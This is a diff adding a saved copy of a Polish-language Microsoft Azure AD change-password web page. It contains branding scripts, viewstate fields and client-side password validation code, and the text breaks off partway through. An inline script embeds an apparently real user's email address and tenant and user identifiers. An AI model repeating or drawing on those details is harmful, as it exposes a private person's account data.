@@ -1,0 +1,1091 @@
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" class="Page-Metro&#32;PageWithNavBar-Metro">
+
+<head id="Head1"><meta http-equiv="X-UA-Compatible" content="IE=EDGE" /><meta charset="utf-8" /><meta name="viewport" content="width=device-width,&#32;initial-scale=1" /><script type='text/javascript'>try {var pageCreationTime = (new Date()).getTime();} catch (ex) {}</script><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/Shared.js">
+
+</script><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/ClientLogService.js">
+
+</script><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/PerformanceTracking.js">
+
+</script><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/XmlHttpRequestService.js">
+
+</script><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/AjaxService.js">
+
+</script><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/OpenSource/jQuery/jquery_min.js">
+
+</script><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/O365Shared.js">
+
+</script><link type="text/css" rel="stylesheet" href="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/css/O365Shared.css" /><link type="text/css" rel="stylesheet" href="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/css/MasterStyles.css" /><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/js/IdsapiEncrypt.js">
+
+</script><link type="text/css" rel="stylesheet" href="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/css/ChangePassword.css" /><style type="text/css"> body { display:none; } </style><link href="/WebResource.axd?d=FDNuHgHi8ScUh6mDnyQ1Kh8HWP5Zf1VHdwRFD20zMtHywaXPMh5HwZA9iBT0m7SAmkpZsW84JearKJcVCPSGwxO6L7ps_KvibZIHYQR3ZkCYEudbHpN-9l73hmWkIidQJV1l2UmDPEZXYi8SI6o67WxmOy0hPsPEsxuLuyFHVBjjgrkNHfRx_zDbDsG16QCHHZMoNLwx5ieVz1yBpHSWBA2&amp;t=638435923197546972" type="text/css" rel="stylesheet" /><link type="text/css" rel="stylesheet" href="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/css/AUXStyle.css" /><script type="text/javascript" src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/InactivityTimer.js">
+
+</script><meta name="DCS.dcsuri" content="/changepassword.aspx:ChangePasswordPage" /><meta name="WT.z_url" content="/changepassword.aspx:ChangePasswordPage" /><meta name="WT.es" content="account.activedirectory.windowsazure.com/changepassword.aspx:ChangePasswordPage" /><meta name="WT.ti" content="ChangePasswordPage" /><script type='text/javascript'>try {var headerFinishTime = (new Date()).getTime();} catch (ex) {}</script><title>
+	Zmień hasło
+</title></head>
+<body>
+    
+
+<script type="text/javascript">  
+    $(document).ready(function () {
+        
+        var user_displayName = "rafal.pezda\x40tarkon.pl";
+        var user_tenant_combination = "073899c3-b0d1-47ea-b2ab-70d987a2a75e\x3a\x3a\x3acbd8bb0a-8e2a-4aec-acd7-11389a7559f0";
+        var portal_url = "https://account.activedirectory.windowsazure.com";
+        var extensionCanUpdate = false;
+        if(sessionStorage){
+            sessionStorage.setItem("extensionCanUpdate", extensionCanUpdate);
+        }
+        if (localStorage && user_tenant_combination && user_tenant_combination != "") {
+            localStorage.setItem("user_tenant_combination", user_tenant_combination);
+        }
+       
+        $('#O365_MainLink_Me').text(user_displayName).css("display", "").attr("aria-label",user_displayName).attr("role", "button");
+        $("img.O365_MainImg").first().attr("src", "/TenantBranding/BannerLogo?tenantId=cbd8bb0a-8e2a-4aec-acd7-11389a7559f0&username=");
+        $("img.O365_MainImgNoHover").first().attr("src", "/TenantBranding/BannerLogo?tenantId=cbd8bb0a-8e2a-4aec-acd7-11389a7559f0&username=");
+        $("img.O365_HoverImg").first().attr("src", "/TenantBranding/BannerLogo?tenantId=cbd8bb0a-8e2a-4aec-acd7-11389a7559f0&username=");
+        $('#O365_MainLink_Logo').attr("href", portal_url);
+        $("img.O365_MainImg").first().css("top", "1px");
+        $("img.O365_MainImgNoHover").first().css("top", "1px");
+        $("img.O365_HoverImg").first().css("top", "1px");
+        $("#O365_FooterContainer").children(":first").css("background-color", "");
+        $("#Help").css("background-color", "").attr("aria-label", "Help").attr("role", "button");
+        $("#O365_TopMenu span").css("background-color", "");
+        $("#O365_PopupMenu_Me").attr("role", "menu");
+        $("#O365_PopupMenu_Help").attr("role", "menu");
+        $("#O365_MainLink_VerticalSep1").attr("role", "separator")
+        
+
+        applyLoginTenantBranding();
+
+        var inPreview = ("False" == "True");
+        if (inPreview) {
+            $("#previewButton").css("display", "inline-block")
+                .removeAttr("onmouseover");
+        }
+        $("#O365_NavBarContainer").show();
+
+        try {
+            //
+            // Bookmarking only works in IE.
+            //
+            if (!(window.external && ('AddFavorite' in window.external))) {
+                $("#BookmarkThisPageLink").removeAttr("href");
+                $("#BookmarkThisPageLink2").removeAttr("href");
+            }
+        }
+        catch (error) {
+            console.log('Window.external is not availabe in this browser. Error: ' + error.message);
+        }
+        
+        
+
+    });
+
+    function applyLoginTenantBranding() {
+
+        
+
+            //
+            // Set the header and footer to have a white background.
+            //
+            $("#O365_NavBar").css({ "background-color": "#ffffff" });
+            $("#O365_MainLink_Me").css({ "background-color": "#ffffff !important", "color": "#333333" });
+            $("#O365_FooterContainer *").css("cssText", "background-color: #ffffff !important");
+            $("#O365_MainLink_TenantName").css({ "background-color": "#ffffff !important", "color": "#333333" });
+            $("#O365_MainLink_VerticalSep1").css({ "background-color": "#ffffff !important", "color": "#333333" });
+            $("#O365_MainLink_VerticalSep2").css({ "background-color": "#ffffff !important", "color": "#333333" });
+            $("#Help").css({ "background-color": "#ffffff !important", "color": "#333333" });
+            $("#O365_TopMenu span").css({ "background-color": "#ffffff !important", "color": "#333333" });
+            $("#O365_Footer span").css("color", "#333333");
+            $("#O365_Footer a").css("color", "#333333");
+            $("#O365_FooterLogo").remove();
+            $("#O365_MainLink_Me").css({ "background-color": "#ffffff" });
+            $("#O365_MainLink_TenantName").css({ "background-color": "#ffffff" });           
+            $(".O365_PopupMenu a").css({ "background-color": "#d7ecf9", "color": "#464f59" });
+            $(".O365_PopupMenu").css("background-color", "#d7ecf9");
+            $("#Help").css("background-color", "#FFF");
+
+        
+
+            $("#O365_NavBar").css("border-bottom", "solid 1px #dcdfe2");
+            $("#O365_Footer_Internal").css("border-top", "solid 1px #dcdfe2");
+            $("#O365_SubLink_ShellSignout").css("background-color", "#FFF").css("color", "#333333");
+            $("#O365_PopupMenu_Me").css("background-color", "#FFF");
+            $("#O365_PopupMenu_Help").css("background-color", "#FFF");
+            $("#O365_SubLink_HelpLink").css("color", "#333333");
+            $("#O365_SubLink_HelpFeedBack").css("color", "#333333");            
+
+        
+
+            //
+            // Set the color change event for hover on menu items
+            $(".O365_PopupMenu a").hover(
+            function () {
+                //mouse over
+                $(this).css("background-color", "#9cd5f4");
+            }, function () {
+                //mouse out
+                $(this).css("background-color", "#d7ecf9");
+            });
+
+            //
+            // Set logo properties.
+            //
+
+            // By setting the height to 30px the width gets scaled to the original image proportion width.
+            $("#O365_Logo").css({ "padding-left": "10px", "padding-right": "10px"});
+            $("span.O365_ImgClip").css("cssText", "height: 30px !important;");
+            $("img.O365_MainImg").css({ "position": "relative", "height": "28px" });
+            $("img.O365_MainImgNoHover").css({ "position": "relative", "height": "30px" });
+            $("img.O365_HoverImg").css({ "position": "relative", "height": "30px" });
+
+            //
+            // Remove link from image.
+            //
+            var logoImageSpan = $("#O365_Logo a").children().first().clone();
+            $("#O365_Logo a").remove();
+            $("#O365_Logo").append(logoImageSpan);
+
+        
+    }
+
+    function bookmarkPage() {
+        window.external.AddFavorite(location.href, document.title);
+    }
+    
+    function RenderShell(navBarData) {
+        $("#O365_NavBarContainer").innerHTML = "";
+        $("#O365_FooterContainer").innerHTML = "";
+        O365Shell.SetData(navBarData);
+        O365Shell.Render({ top: "O365_NavBarContainer", bottom: "O365_FooterContainer" }, function () {
+            // the callback that will be executed when common shell is loaded
+            $(".Page-Metro a.Button span").addClass("o365-p-c o365-p-bg o365-t-c o365-p-b");
+
+            $(".Page-Metro a").addClass("o365-d2-ch");
+            
+        });
+    }
+    
+    function HandleO365ThemeButtonHover() {
+        // If button span has the theme class at first time rendering, it means current page is using Gemini Shell theme
+        if ($(".Page-Metro a.Button span").hasClass("o365-p-c")) {
+            $(".Page-Metro a.Button span").mouseover(function () {
+                $(".Page-Metro a.Button span").addClass("o365-d2-ch o365-d2-bgh o365-t-ch o365-d2-bh");
+            });
+            $(".Page-Metro a.Button span").mouseout(function () {
+                // Do nothing as we  already set up the color
+            });
+        }
+    }
+    
+
+    var sessionExpiryRemainingTime = "0";
+    var timerElementId = "SessionExpiryTimer";
+    var timerText = "Twoja sesja wygaśnie za {0}";
+    var timerCallbackFunctionName = "";
+    var timerInterval = null;
+
+    function SetupSessionExpiryTimer()
+    {
+        // Add the element to the Shell
+        var timerMarkup = "<div id='" + timerElementId + "'></div>";
+        $("#O365_Footer").css("float", "left");
+        $("#O365_Footer_Internal").append(timerMarkup);
+        $("#" + timerElementId).css("cssText", "color:#DD1818; background-color: #ffffff !important;");
+
+        // Start the timer
+        timerInterval  = window.setInterval(UpdateSessionExpiryRemainingTime, 1000);
+
+        
+
+    }
+
+    function UpdateSessionExpiryRemainingTime() {
+        sessionExpiryRemainingTime--;
+
+        var minutes = (sessionExpiryRemainingTime / 60) - ((sessionExpiryRemainingTime / 60) % 1);
+        var seconds = sessionExpiryRemainingTime % 60;
+        var time = formatTwoDigitTimeValue(minutes) + ":" + formatTwoDigitTimeValue(seconds);
+
+        $("#" + timerElementId).html(timerText.replace("{0}", time));
+
+        if(minutes == 0 && seconds == 0)
+        {
+            // Stop the interval
+            window.clearInterval(timerInterval);
+
+            // Call the callback function
+            window[timerCallbackFunctionName]();
+        }
+    }
+
+    function formatTwoDigitTimeValue(value) {
+        if(value < 10) {
+            return "0" + value.toString();
+        }
+        else {
+            return value;
+        }
+    }
+</script>
+    <form name="ChangePasswordForm" method="post" action="./ChangePassword.aspx" onsubmit="javascript:return WebForm_OnSubmit();" id="ChangePasswordForm" autocomplete="off">
+<div>
+<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['ChangePasswordForm'];
+if (!theForm) {
+    theForm = document.ChangePasswordForm;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=vLEK5hVGho-YhmmEOPnRWqB3RJQ0iQp7g15xO1ALkFUygbPntoWpyoB-1rdhC9Y7W65e9HdnT-lHpl4zPcOmT5-XR4cnto4dToGAirFJ8ws6QQt60y2fZ-xoy9ORCww5QZtlmB_jtoUhvST3mcNr9A2&amp;t=638449966681238214" type="text/javascript"></script>
+
+
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JSC/MicrosoftAjaxCombined.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/WebControls/JS/TextBox.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+var passwordStrengthLocalizedTextOptions = {'Initial' : 'Siła hasła',
+                                                     'Strong' : 'Silne',
+                                                     'Medium' : 'Średnie',
+                                                     'Weak' : 'Słabe' };//]]>
+</script>
+
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/Webcontrols/js/ProgressBar.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/WebControls/js/PasswordStrengthMeter.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/WebControls/JS/Button.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/WebControls/JS/PageLayout.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/Shell/JS/Shell.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/js/O365Branding.js" type="text/javascript"></script>
+<script src="https://login.microsoftonline.com/ppsecure/JSPublicKey.srf" type="text/javascript"></script>
+<script src="https://login.microsoftonline.com/ppsecure/js/PPRSAEnc.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+$addHandler(window, 'resize', PageLayout.WindowResizeEvent);//]]>
+</script>
+
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/WebControls/JS/PropertySheet.js" type="text/javascript"></script>
+<script src="/ScriptResource.axd?d=q9NVCD1c4NPkFLIrrDp1_a4V6C0q1jfqPVJAERqBOqMKleyPLAwiCl3ojFKVivGs-2s4-fV3a8dEdE3ZZkLtnIFCKNrbqsGv0hTgaYgudBvc2cW5hQJdTFMfot9sfH6KwkJpWMLAczYdLJ6GIyPurqEvkQ5BTDzoN9i2SKR9xL8-UCaC_4oARg49eVkYt-uzEBGWzNRx6fDowmNEzmtwuA2&amp;t=fffffffff37b5a97" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/WebControls/JS/DialogManager.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/JS/sscompat.js" type="text/javascript"></script>
+<script src="https://account.activedirectory.windowsazure.com/1.0.0.4655/Chrome/pl-PL/WebControls/JS/ImageButton.js" type="text/javascript"></script>
+<script src="/WebResource.axd?d=ouGVjwoCKimzI8sfbmqHeahzpw6XnL7qDIqX0zcO5itUGBE9yvvuYHnnsOZ25dcJAd_kEIu50NBlb7JMZPAI-do9h002_j2Vb0Al7gXRE0bgzNbxaLztsodI5_iQzTb1eKkq6CnL477J6pcT4s9k3A2&amp;t=638449966681238214" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+function WebForm_OnSubmit() {
+if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
+return true;
+}
+//]]>
+</script>
+
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="05F80A9A" />
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="xaK4yw0GbPjpCZXFLxH+1c3KSkEsL8EfZnvCrmB7pL11KzcUklMjCYoGr+utnI4WoklBKHNloAaQJEKaRtFWMgwyT2jYTP0Q0rqfwA4RYNa4YY34YCUOmonMNMutVXE6PRkQShJ8DDVgEdBzbQdhk1EOoMdxE2ZyNQBePP91edj/S84Rf7cgELOjTey1XmhgKoUgTG7S17HeALe088b04hhP4oo8slChGQgXdxPtqySWic5V5BVJErp8SdjbC1XLfoOqF7RI3QNevgPmdl+ooBplTGcXP3dyifbSmsrUuZid7UqXVxJ50lPhL2ffC5vvOnexPOdKfoQfuNpNOugbEGpuElFAB9nIvxE1yJL3k6BmUl/zSwSrYC6Ih/v8ELA1MhWLgv3115plAvhMkTClIhaHI2xrYIxmKx9qI/cCsrvVAVnhZyQB0pcQHSqUylD9s+g4WVfJBNGOoyPb3VQ8BPJ0fZ65XMTrCZmdiU1wWjR+CptY4VuFCBB459u852Mo/aZfBL0NwDx4c/Og+cgxEu3Ts8FjgJTdXGrk0dP/Wwk=" />
+</div><script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ScriptManager1', 'ChangePasswordForm', [], [], [], 90, '');
+//]]>
+</script>
+<div class="Shell-Metro" id="ShellContainer">
+	<div id="ShellHeader">
+		<div id="O365_NavBarContainer">
+
+		</div>
+	</div><div id="ShellBodyAndFooterContainer">
+		<div id="ShellBody" class="Shell-Body">
+			
+        <div class="ChangePasswordControls">
+            <div class="PageLayout">
+				<table class="Content" cellspacing="0" cellpadding="0" role="presentation">
+					<tr>
+						<td class="Content"><table class="Content" cellspacing="0" cellpadding="0" role="presentation">
+							<tr>
+								<td class="PageLayout-ContentPanelNoNav"><div class="PageLayout-Padding">
+
+								</div><div class="Home-Heading-Container">
+									<h1 class="shell-page-title">
+										Zmień hasło
+									</h1>
+								</div><div class="PageLayout-Panels">
+									<div class="PageLayout-Panel" style="width:100%;">
+										<div>
+											
+                        
+                                <div id="mainDivChangePassword">
+                                    <span id="ChangePasswordPropertySheet" boxtype="PropertySheet" class="PropertySheet"><input type="hidden" id="ChangePasswordPropertySheet_Collapsed" name="ChangePasswordPropertySheet" value="0" /><div id="ChangePasswordPropertySheet_Body">
+												<div class="ContentContainer">
+													<table cellpadding="0" cellspacing="0">
+														<tr class="PropertySheetItem">
+															<td id="ChangePasswordPropertySheetItem" class="Content">
+                                                    
+<script type="text/javascript">
+
+    var ChangePassword = new Object();
+
+    //TODO: Never check in, just for devfabric
+    ChangePassword.RSAPublicKeyUrl = 'https://login.microsoftonline.com/ppsecure/JSPublicKey.srf';
+    ChangePassword.RSAJscriptUrl = 'https://login.microsoftonline.com/ppsecure/js/PPRSAEnc.js';
+    //ChangePassword.RSAPublicKeyUrl = "https://login.microsoftonline.com/ppsecure/JSPublicKey.srf?ct=1400542460&rver=6.1.6206.0&lc=1033&id=500634";
+    //ChangePassword.RSAJscriptUrl = "https://login.microsoftonline.com/ppsecure/js/PPRSAEnc.js?ct=1400542460&rver=6.1.6206.0&lc=1033&id=500634";
+
+    ChangePassword.ClientEncryptionPublicKey = '';
+    ChangePassword.EmailLabel = 'ChangePasswordControl_EmailLabel';
+
+    ChangePassword.OldPasswordTextBoxName = 'ChangePasswordControl_OldPasswordTextBox';
+    ChangePassword.NewPasswordTextBoxName = 'ChangePasswordControl_NewPasswordTextBox';
+    ChangePassword.ConfirmNewPasswordTextBoxName = 'ChangePasswordControl_ConfirmNewPasswordTextBox';
+    ChangePassword.OldPasswordRequiredValidatorName = 'ChangePasswordControl_OldPasswordRequiredValidator';
+
+    ChangePassword.NewPasswordMinimumLengthValidatorName = 'ChangePasswordControl_NewPasswordMinimumLengthValidator';
+    ChangePassword.NewPasswordMaximumLengthValidatorName = 'ChangePasswordControl_NewPasswordMaximumLengthValidator';
+    ChangePassword.NewPasswordCharacterExpressionValidatorName = 'ChangePasswordControl_NewPasswordCharacterExpressionValidator';
+    ChangePassword.NewPasswordRequiredValidatorName = 'ChangePasswordControl_NewPasswordRequiredValidator';
+
+    ChangePassword.ConfirmNewPasswordMinimumLengthValidatorName = 'ChangePasswordControl_ConfirmNewPasswordMinimumLengthValidator';
+    ChangePassword.ConfirmNewPasswordMaximumLengthValidatorName = 'ChangePasswordControl_ConfirmNewPasswordMaximumLengthValidator';
+    ChangePassword.ConfirmNewPasswordCharacterExpressionValidatorName = 'ChangePasswordControl_ConfirmNewPasswordCharacterExpressionValidator';
+    ChangePassword.ConfirmNewPasswordRequiredValidatorName = 'ChangePasswordControl_ConfirmNewPasswordRequiredValidator';    
+    
+    ChangePassword.PasswordMatchValidatorName = 'ChangePasswordControl_PasswordMatchValidator';
+    ChangePassword.CheckPasswordStrengthValidatorName = 'ChangePasswordControl_PasswordStrengthValidator';
+    ChangePassword.OldAndNewPasswordsAreDifferentCustomValidatorName = 'ChangePasswordControl_OldAndNewPasswordsAreDifferentCustomValidator';
+
+    ChangePassword.OldPasswordCipherTextName = 'ChangePasswordControl_OldPasswordCipherTextField';
+    ChangePassword.CredentialsCipherTextName = 'ChangePasswordControl_CredentialsCipherTextField';
+    ChangePassword.HexBinarySkiFieldName = 'ChangePasswordControl_HexBinarySkiField';
+    ChangePassword.EncryptionVersionFieldName = 'ChangePasswordControl_EncryptionVersionField';
+
+    ChangePassword.EncryptedOldPasswordTextName = 'ChangePasswordControl_EncryptedOldPasswordTextField';
+    ChangePassword.EncryptedNewPasswordTextName = 'ChangePasswordControl_EncryptedNewPasswordTextField';
+
+    ChangePassword.EncodedOldPasswordTextName = 'ChangePasswordControl_EncodedOldPasswordTextField';
+    ChangePassword.EncodedNewPasswordTextName = 'ChangePasswordControl_EncodedNewPasswordTextField';
+
+    ChangePassword.IsClientEncryptionRequired = 'False';
+
+    ChangePassword.SubmitButton = 'ChangePasswordControl_OkButton';
+    ChangePassword.CancelButton = 'ChangePasswordControl_CancelButton';
+
+    ChangePassword.CheckPasswordMatch = function(source, arguments) {
+        arguments.IsValid = this.ValidatePasswords();
+    }
+
+    ChangePassword.CheckPasswordStrength = function (source, arguments) {
+        arguments.IsValid = true;
+
+        if (ChangePassword.BeforePasswordStrength()) {
+            arguments.IsValid = PasswordStrengthMeter.ClientSideStrongPassword(arguments.Value);
+        }
+    }
+
+    ChangePassword.BeforePasswordStrength = function () {
+        // first check if password legth is valid; // check that  only visible chars are present
+        var resultIsValid = true;
+        var minLength_val = document.getElementById(this.NewPasswordMinimumLengthValidatorName);
+        ValidatorValidate(minLength_val);
+        resultIsValid = minLength_val.isvalid && resultIsValid;
+        if (resultIsValid) {
+            var maxLength_val = document.getElementById(this.NewPasswordMaximumLengthValidatorName);
+            ValidatorValidate(maxLength_val);
+            resultIsValid = maxLength_val.isvalid && resultIsValid;
+            if (resultIsValid) {
+                // check that  only visible chars are present
+                var char_val = document.getElementById(ChangePassword.NewPasswordCharacterExpressionValidatorName);
+                ValidatorValidate(char_val);
+                resultIsValid = char_val.isvalid && resultIsValid;
+            }
+        }
+
+        return resultIsValid;
+
+    }
+
+    ChangePassword.CheckNewPasswordIsDifferentFromOld = function(source, arguments) {
+        arguments.IsValid = this.ValidateNewAndOldPasswordsAreDifferent();
+    }
+
+    ChangePassword.AggregateValidator = function (source, arguments) {
+        arguments.IsValid = true;
+
+        var validatorMessages = $("." + source.className);
+        $(validatorMessages).css("display", "none");
+
+        for (var i = 0; i < validatorMessages.length; i++) {
+            if ($(validatorMessages[i]).css("visibility") == "visible") {
+                $(validatorMessages[i]).css("display", "block");
+                break;
+            }
+        }
+    }
+
+    /// <summary>
+    // This method is intended to set UI properties after the page post back.
+    /// </summary>
+    ChangePassword.CustomServerValidator = function (source, arguments) {
+        arguments.IsValid = true;
+        $("#" + source.id).css("display", "none");
+    }
+
+    ChangePassword.ValidateNewAndOldPasswordsAreDifferent = function() {
+        if (document.getElementById(this.OldPasswordTextBoxName).value == document.getElementById(this.NewPasswordTextBoxName).value) {
+            return false;
+        }
+
+        return true;
+    }
+
+    ChangePassword.ValidatePasswords = function() {
+        if (document.getElementById(this.NewPasswordTextBoxName).value == '') {
+            return false;
+        }
+
+        if (document.getElementById(this.NewPasswordTextBoxName).value != document.getElementById(this.ConfirmNewPasswordTextBoxName).value) {
+            return false;
+        }
+        return true;
+    }
+
+    ChangePassword.ValidateAndEncryptCredentials = function () {
+
+        this.EvaluateValidators();
+
+        if (typeof (ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) {
+            this.ReportClientSideError("The ValidatorOnSubmit() method result is false.");
+            return;
+        }
+
+        if (Page_IsValid == false) {
+            return false;
+        }
+
+        var locals = new Array();
+
+        try
+        {
+            // Set the local Functions and Variables 
+            // for logging purposes.
+
+            // Functions
+            locals.push("Is parseRSAKeyFromString is defined: " + (typeof (parseRSAKeyFromString) == "function"))
+            locals.push("Is RSAencrypt is defined: " + (typeof (RSAencrypt) == "function"))
+
+            // Variables
+            locals.push("SKI value: " + SKI);
+            locals.push("EncryptionVersion value: " + EncryptionVersion);
+
+            // Input Fields
+            var oldPassword = document.getElementById(this.OldPasswordTextBoxName);
+            var newPassword = document.getElementById(this.NewPasswordTextBoxName);
+            var confirmNewPassword = document.getElementById(this.ConfirmNewPasswordTextBoxName);
+
+
+            if (ChangePassword.IsClientEncryptionRequired == 'True') {
+                // Encryption Values
+                var OldPasswordCipherTextValue = EncryptOldPassword(oldPassword.value);
+                locals.push("OldPasswordCipherText value: " + OldPasswordCipherTextValue);
+
